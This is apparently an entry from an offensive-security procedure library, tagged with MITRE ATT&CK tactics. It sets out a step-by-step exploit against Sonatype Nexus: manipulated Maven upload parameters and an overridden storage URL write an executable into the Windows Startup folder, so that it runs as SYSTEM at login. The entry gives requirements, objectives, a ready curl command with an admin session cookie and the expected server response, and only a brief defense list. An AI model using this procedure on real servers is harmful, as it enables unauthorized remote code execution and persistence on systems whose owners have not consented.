---
id: c3d4e5f6-g7h8-9012-cdef-345678901234
tags:
  - nexus
  - rce
  - persistence
  - windows-startup
type: procedure
tools: []
tactics:
  - '[[Execution]]'
  - '[[Persistence]]'
commands:
  - '[[commands/curl-upload-artifact-to-startup]]'
verified: false
platforms:
  - Web
  - Windows
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Registry Run Keys - Startup Folder]]'
  - '[[PowerShell]]'
updated_at: '2025-12-14T05:32:10.451Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Persistence]]'
mitre_techniques:
  - '[[Registry Run Keys - Startup Folder]]'
  - '[[PowerShell]]'
---
# Upload-Executable-to-Windows-Startup-Folder-via-Maven-Artifact

## Summary

This procedure uploads an executable file to the Windows Startup folder using the Maven artifact upload endpoint in a custom Nexus repository, leveraging manipulated parameters for path control and achieving persistent RCE upon user login.

## Description

After creating a custom repository with overridden storage, the /nexus/service/local/artifact/maven/content endpoint allows multipart uploads where groupId (g), artifactId (a), and version (v) construct the relative path without validation. Combined with the custom storage URL, this enables writing files like calc.exe to C:/Users/myuser/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/calc.exe. Nexus runs as SYSTEM on Windows, so the executable gains high privileges on execution during login, facilitating persistence, escalation, and movement.

## Requirements

1. Custom repository (ID 5000) with overrideLocalStorageUrl set
2. Valid admin session cookie
3. Binary file ready (e.g., calc.exe from Windows System32)
4. Knowledge of Maven param mapping to paths (g/a/v for directories)

## Defense

Defensive measures and detection strategies:

- Sanitize g, a, v parameters to prevent path construction outside repo storage
- Disable or restrict overrideLocalStorageUrl in repository creation
- Audit file writes to sensitive paths like Startup folder via Windows event logs (Event ID 4663)

## Objectives

1. Upload executable using manipulated Maven parameters
2. Place file in auto-execution path for persistence
3. Achieve RCE as SYSTEM on system login or restart

## Instructions

### Step 1: Prepare and Send Upload Request

**Context**: Use multipart/form-data to upload the file, setting r=5000 (repo), g=Programs, a=Startup, v=. to form Programs/Startup/. relative to storage URL.

**Command** ([[commands/curl-upload-artifact-to-startup]]):
```bash
curl -X POST 'http://nexus-host:8081/nexus/service/local/artifact/maven/content' \
  -H 'Cookie: NXSESSIONID=1a76b0cd-7fb1-4095-9671-2365226df770' \
  -F 'r=5000' \
  -F 'g=Programs' \
  -F 'a=Startup' \
  -F 'v=.' \
  -F 'p=jar' \
  -F 'c=637' \
  -F 'e=exe' \
  -F 'file=@calc.exe'
```

> This POSTs to the artifact endpoint, placing calc.exe at the target path. Expected output: HTTP 201 with {"groupId":"Programs","artifactId":"Startup","version":".","packaging":"jar"}. Verify by checking the file on the server filesystem.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Persistence]]

### Techniques

- [[Registry Run Keys - Startup Folder]]
- [[PowerShell]]

### Sub-Techniques


## Commands Used

- [[commands/curl-upload-artifact-to-startup]]

## Tools Used


## Tags

- nexus
- rce
- persistence
- windows-startup
